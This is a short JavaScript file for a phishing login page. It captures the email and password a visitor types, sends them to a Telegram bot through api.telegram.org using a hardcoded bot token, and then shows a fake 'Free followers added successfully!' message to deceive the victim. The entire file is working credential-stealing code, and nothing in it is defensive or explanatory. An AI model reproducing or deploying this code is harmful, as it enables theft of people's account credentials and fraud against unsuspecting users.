document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  
  // Replace with your Telegram bot token and chat ID
  var botToken = '8133707124:AAF7iFSZy8jaNuOw6mNMAvKMcOd9f_vLRyg';
  var chatId = 'YOUR_CHAT_ID'; // Replace with your actual chat ID
  
  var message = `Email: ${email}\nPassword: ${password}`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Message sent:', data);
      alert('Free followers added successfully!');
    })
    .catch(error => {
      console.error('Error sending message:', error);
      alert('Failed to add free followers. Please try again.');
    });
});